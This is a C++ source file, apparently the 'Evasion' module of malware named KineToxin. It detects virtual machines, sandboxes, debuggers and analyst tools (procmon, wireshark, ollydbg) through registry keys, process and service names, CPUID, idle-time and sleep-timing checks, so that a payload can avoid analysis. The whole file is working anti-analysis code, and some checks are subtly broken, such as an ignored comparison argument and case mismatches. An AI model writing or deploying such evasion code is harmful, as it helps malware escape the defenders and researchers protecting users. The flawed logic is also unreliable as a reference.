#include "vm_detection.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <intrin.h>
#include <iostream>
#include <algorithm>

namespace KineToxin {
namespace Evasion {

// Known VM/Sandbox artifacts
const std::vector<std::string> VMDetection::VM_PROCESSES = {
    "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe", "vmware.exe",
    "vboxservice.exe", "vboxtray.exe", "vboxcontrol.exe",
    "qemu-ga.exe", "windanr.exe", "vmsrvc.exe", "vmusrvc.exe",
    "prl_cc.exe", "prl_tools.exe", "xenservice.exe"
};

const std::vector<std::string> VMDetection::VM_SERVICES = {
    "vmtools", "vmhgfs", "vmmouse", "vmxnet", "vmci", "vmx86",
    "vboxdrv", "vboxsf", "vboxmouse", "vboxguest", "vboxvideo",
    "qemuwmi", "qga", "vioscsi", "vioser", "balloon", "netkvm"
};

const std::vector<std::string> VMDetection::SANDBOX_ARTIFACTS = {
    "sbiedll.dll", "dbghelp.dll", "api_log.dll", "dir_watch.dll",
    "pstorec.dll", "vmcheck.dll", "wpespy.dll", "cmdvrt32.dll",
    "cmdvrt64.dll", "snxhk.dll"
};

const std::vector<std::string> VMDetection::ANALYSIS_TOOLS = {
    "ollydbg.exe", "ProcessHacker.exe", "tcpview.exe", "autoruns.exe",
    "autorunsc.exe", "filemon.exe", "procmon.exe", "regmon.exe",
    "procexp.exe", "sysinternals.exe", "wireshark.exe", "dumpcap.exe",
    "hookanaapp.exe", "importrec.exe", "petools.exe", "lordpe.exe",
    "syseraser.exe", "windump.exe", "taskmgr.exe"
};

BOOL VMDetection::IsVirtualMachine() {
    // Run multiple detection methods
    if (CheckVMware() || CheckVirtualBox() || CheckHyperV() || 
        CheckQEMU() || CheckHardwareArtifacts() || 
        CheckRegistryArtifacts() || CheckProcessArtifacts() || 
        CheckServiceArtifacts() || CheckCPUArtifacts()) {
        return TRUE;
    }
    
    return FALSE;
}

BOOL VMDetection::IsSandboxEnvironment() {
    return CheckSandboxBehaviors() || 
           !CheckUserInteraction() || 
           CheckTimingAnomalies();
}

BOOL VMDetection::IsDebuggingDetected() {
    // Check for debugger presence
    if (IsDebuggerPresent()) {
        return TRUE;
    }
    
    // Check for remote debugger
    BOOL bRemoteDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bRemoteDebugger);
    if (bRemoteDebugger) {
        return TRUE;
    }
    
    // Check for analysis tools
    for (const auto& tool : ANALYSIS_TOOLS) {
        if (IsProcessRunning(tool)) {
            return TRUE;
        }
    }
    
    return FALSE;
}

BOOL VMDetection::IsAnalysisEnvironment() {
    return IsVirtualMachine() || IsSandboxEnvironment() || IsDebuggingDetected();
}

BOOL VMDetection::CheckVMware() {
    // Check for VMware registry keys
    if (CheckRegistryValue(HKEY_LOCAL_MACHINE, 
                          "SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_15AD*", 
                          "", "") ||
        CheckRegistryValue(HKEY_LOCAL_MACHINE,
                          "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000",
                          "DriverDesc", "VMware")) {
        return TRUE;
    }
    
    // Check for VMware processes
    for (const auto& process : VM_PROCESSES) {
        if (process.find("vmware") != std::string::npos || 
            process.find("vmtool") != std::string::npos) {
            if (IsProcessRunning(process)) {
                return TRUE;
            }
        }
    }
    
    return FALSE;
}

BOOL VMDetection::CheckVirtualBox() {
    // Check for VirtualBox registry keys
    if (CheckRegistryValue(HKEY_LOCAL_MACHINE,
                          "HARDWARE\\DESCRIPTION\\System",
                          "SystemBiosVersion", "VBOX") ||
        CheckRegistryValue(HKEY_LOCAL_MACHINE,
                          "HARDWARE\\DESCRIPTION\\System",
                          "VideoBiosVersion", "VIRTUALBOX")) {
        return TRUE;
    }
    
    // Check for VirtualBox processes
    for (const auto& process : VM_PROCESSES) {
        if (process.find("vbox") != std::string::npos) {
            if (IsProcessRunning(process)) {
                return TRUE;
            }
        }
    }
    
    return FALSE;
}

BOOL VMDetection::CheckHyperV() {
    // Check for Hyper-V artifacts
    if (CheckRegistryValue(HKEY_LOCAL_MACHINE,
                          "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
                          "", "") ||
        CheckRegistryValue(HKEY_LOCAL_MACHINE,
                          "SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
                          "SystemProductName", "Virtual Machine")) {
        return TRUE;
    }
    
    return FALSE;
}

BOOL VMDetection::CheckQEMU() {
    // Check for QEMU artifacts
    if (CheckRegistryValue(HKEY_LOCAL_MACHINE,
                          "HARDWARE\\DESCRIPTION\\System",
                          "SystemBiosVersion", "QEMU") ||
        CheckRegistryValue(HKEY_LOCAL_MACHINE,
                          "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                          "ProcessorNameString", "QEMU")) {
        return TRUE;
    }
    
    return FALSE;
}

BOOL VMDetection::CheckHardwareArtifacts() {
    // Check MAC address for VM vendors
    // VMware: 00:05:69, 00:0c:29, 00:1c:14, 00:50:56
    // VirtualBox: 08:00:27
    // This is a simplified check - real implementation would enumerate network adapters
    
    return FALSE; // Simplified for educational purposes
}

BOOL VMDetection::CheckRegistryArtifacts() {
    // Check various VM-related registry entries
    std::vector<std::pair<std::string, std::string>> vmRegKeys = {
        {"HARDWARE\\DESCRIPTION\\System", "SystemBiosVersion"},
        {"HARDWARE\\DESCRIPTION\\System", "VideoBiosVersion"},
        {"SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_80EE*", ""},
        {"SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_15AD*", ""}
    };
    
    for (const auto& key : vmRegKeys) {
        if (CheckRegistryValue(HKEY_LOCAL_MACHINE, key.first, key.second, "")) {
            return TRUE;
        }
    }
    
    return FALSE;
}

BOOL VMDetection::CheckProcessArtifacts() {
    for (const auto& process : VM_PROCESSES) {
        if (IsProcessRunning(process)) {
            return TRUE;
        }
    }
    
    return FALSE;
}

BOOL VMDetection::CheckServiceArtifacts() {
    for (const auto& service : VM_SERVICES) {
        if (IsServicePresent(service)) {
            return TRUE;
        }
    }
    
    return FALSE;
}

BOOL VMDetection::CheckCPUArtifacts() {
    // Check for hypervisor bit in CPUID
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);
    
    // Check hypervisor present bit (bit 31 of ECX)
    if (cpuInfo[2] & (1 << 31)) {
        return TRUE;
    }
    
    return FALSE;
}

BOOL VMDetection::CheckSandboxBehaviors() {
    // Check for sandbox-specific DLLs
    for (const auto& dll : SANDBOX_ARTIFACTS) {
        HMODULE hMod = GetModuleHandleA(dll.c_str());
        if (hMod != NULL) {
            return TRUE;
        }
    }
    
    return FALSE;
}

BOOL VMDetection::CheckUserInteraction() {
    // Check for recent user activity
    LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };
    if (GetLastInputInfo(&lii)) {
        DWORD dwIdleTime = GetTickCount() - lii.dwTime;
        // If no input for more than 5 minutes, likely automated
        if (dwIdleTime > 300000) {
            return FALSE;
        }
    }
    
    // Check cursor position changes
    POINT pt1, pt2;
    GetCursorPos(&pt1);
    Sleep(100);
    GetCursorPos(&pt2);
    
    // If cursor hasn't moved, likely automated
    return (pt1.x != pt2.x || pt1.y != pt2.y);
}

BOOL VMDetection::CheckTimingAnomalies() {
    // Time acceleration detection
    DWORD dwStart = GetTickCount();
    Sleep(1000);
    DWORD dwEnd = GetTickCount();
    
    DWORD dwElapsed = dwEnd - dwStart;
    
    // If sleep was accelerated significantly, likely in sandbox
    return (dwElapsed < 900 || dwElapsed > 1100);
}

BOOL VMDetection::CheckRegistryValue(HKEY hKey, const std::string& subKey,
                                    const std::string& valueName,
                                    const std::string& expectedValue) {
    HKEY hRegKey;
    LONG lResult = RegOpenKeyExA(hKey, subKey.c_str(), 0, KEY_READ, &hRegKey);
    
    if (lResult != ERROR_SUCCESS) {
        return FALSE;
    }
    
    char szValue[256];
    DWORD dwSize = sizeof(szValue);
    DWORD dwType;
    
    lResult = RegQueryValueExA(hRegKey, valueName.c_str(), NULL, &dwType,
                              (LPBYTE)szValue, &dwSize);
    
    RegCloseKey(hRegKey);
    
    if (lResult == ERROR_SUCCESS) {
        std::string value(szValue);
        // Convert to lowercase for comparison
        std::transform(value.begin(), value.end(), value.begin(), ::tolower);
        
        // Check if value contains VM-related strings
        return (value.find("vmware") != std::string::npos ||
                value.find("vbox") != std::string::npos ||
                value.find("qemu") != std::string::npos ||
                value.find("virtual") != std::string::npos);
    }
    
    return FALSE;
}

BOOL VMDetection::IsProcessRunning(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }
    
    do {
        std::string exeFile(pe32.szExeFile);
        std::transform(exeFile.begin(), exeFile.end(), exeFile.begin(), ::tolower);
        
        if (exeFile == processName) {
            CloseHandle(hSnapshot);
            return TRUE;
        }
    } while (Process32Next(hSnapshot, &pe32));
    
    CloseHandle(hSnapshot);
    return FALSE;
}

BOOL VMDetection::IsServicePresent(const std::string& serviceName) {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCManager == NULL) {
        return FALSE;
    }
    
    SC_HANDLE hService = OpenServiceA(hSCManager, serviceName.c_str(), SERVICE_QUERY_STATUS);
    BOOL bResult = (hService != NULL);
    
    if (hService) {
        CloseServiceHandle(hService);
    }
    
    CloseServiceHandle(hSCManager);
    return bResult;
}

} // namespace Evasion
} // namespace KineToxin
